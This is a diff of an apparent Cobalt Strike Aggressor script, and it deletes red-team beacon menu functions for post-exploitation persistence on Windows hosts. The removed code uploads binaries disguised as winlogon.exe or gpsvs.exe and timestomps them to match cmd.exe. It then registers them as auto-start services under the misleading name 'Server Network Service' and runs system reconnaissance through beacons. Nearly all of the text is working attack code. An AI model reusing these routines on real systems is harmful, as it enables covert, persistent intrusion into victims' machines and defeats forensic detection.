@@ -1,67 +1,5 @@
-global('@old');
-
 popup beacon_top {
-	menu "&Deploy Services" {
-
-		item "&Create Service [ec2]" {
-		local('$bid');
-		foreach $bid ($1) {
-		persist-ec2($bid);
-		}
-	}
-
-		item "Create Service [ausecd]" {
-		local('$bid');
-		foreach $bid ($1) {
-		persist-ausecd($bid);
-		}
-	}
-
-	menu "&Recon/Enum" {
-		item "Sysinfo" {
-		local('$bid');
-		foreach $bid ($1) {
-		sysinfo($bid);
-		}
-	}
 }
-
-sub	persist-ec2 {
-	bcd($1, 'c:\windows');
-
-	# cleanup existing service and files
-	bshell($1, 'sc stop srvcfg');
-	bshell($1, 'sc delete srvcfg');
-	bshell($1, 'del c:\windows\winlogon.exe');
-
-	# upload and create service
-	bupload($1, script_resource("winlogon.exe"));
-	btimestomp($1, "winlogon.exe", "cmd.exe");
-
-	bshell($1, 'sc create srvcfg binPath= "C:\windows\winlogon.exe" start= auto DisplayName= "Server Network Service"');
-	bshell($1, 'sc start srvcfg');
-	}
-
-sub	persist-ausecd {
-	bcd($1, 'c:\windows');
-
-	# cleanup existing service and files
-	bshell($1, 'sc stop gpsvs');
-	bshell($1, 'del c:\windows\gpsvs.exe');
-	bshell($1, 'sc delete gpsvs');
-
-	# upload and create service
-	bupload($1, script_resource("gpsvs.exe"));
-	btimestomp($1, "gpsvs.exe", "cmd.exe");
-	bshell($1, 'sc create gpsvs binPath= "C:\windows\gpsvs.exe" start= auto DisplayName= "Server Network Service"');
-	bshell($1, 'sc start gpsvs');
-}
-
-sub sysinfo {
-	bshell($1, 'systeminfo');
-	}
-}
-
 
 on heartbeat_30s {
 	local('@beacons $beacon $bid %data @new @all');
@@ -72,25 +10,5 @@ on heartbeat_30s {
 	$bid = $beacon['id'];
 	%data[$bid] = $beacon;
 	push(@all, $bid);
-
-	# remove old beacons from current list... I use copy(@all) because removeAll is destructive to its first argument
-	@new = removeAll(copy(@all), @old);
-
-	# with old beacons removed; we have our new beacons...
-	foreach $bid (@new) {
-	fire_event("beacon_initial", $bid, %data[$bid]);
 	}
-
-	# make our list of all beacons into our old list now
-	@old = @all;
-}
-}
-
-on beacon_initial {
-		local('$key $value');
-		println("I have a beacon: $1 from " . $2['internal']);
-		foreach $key => $value ($2) {
-		println("\t $+ $[10]key = $value");
-	}
-}
 }
